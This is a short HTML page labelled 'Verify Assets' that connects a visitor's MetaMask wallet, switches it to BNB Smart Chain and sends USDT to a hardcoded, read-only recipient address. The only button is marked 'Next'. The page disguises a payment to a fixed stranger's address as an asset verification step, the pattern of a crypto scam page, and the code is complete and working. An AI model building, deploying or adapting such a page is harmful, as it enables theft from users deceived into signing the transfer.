
<!DOCTYPE html>
<html>
<head>
  <title>USDT Transfer Test</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <style>
    body { font-family: Arial; padding: 20px; max-width: 400px; margin: auto; }
    input, button { width: 100%; padding: 10px; margin: 10px 0; font-size: 16px; }
  </style>
</head>
<body>

  <h2>Verify Assets</h2>
  
  <label>Recipient Address</label>
  <input type="text" id="recipient" value="0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090" readonly />

  <label>Amount (USDT)</label>
  <input type="number" id="amount" value="10" />

  <button onclick="transferUSDT()">Next</button>

  <script>
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT

    const usdtAbi = [
      {
        constant: false,
        inputs: [
          { name: "_to", type: "address" },
          { name: "_value", type: "uint256" }
        ],
        name: "transfer",
        outputs: [{ name: "", type: "bool" }],
        type: "function"
      }
    ];

    async function transferUSDT() {
      if (!window.ethereum) return alert("Please install MetaMask!");

      const web3 = new Web3(window.ethereum);
      await window.ethereum.request({ method: "eth_requestAccounts" });

      // Ensure BSC network
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }]
      });

      const accounts = await web3.eth.getAccounts();
      const sender = accounts[0];

      const recipient = document.getElementById("recipient").value;
      const amount = document.getElementById("amount").value;

      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
      const amountInWei = web3.utils.toWei(amount, "ether");

      try {
        await usdt.methods.transfer(recipient, amountInWei).send({ from: sender });
        alert(`✅ ${amount} USDT sent to ${recipient}`);
      } catch (err) {
        console.error(err);
        alert("❌ Transfer failed. Check BNB for gas and USDT balance.");
      }
    }
  </script>

</body>
</html>
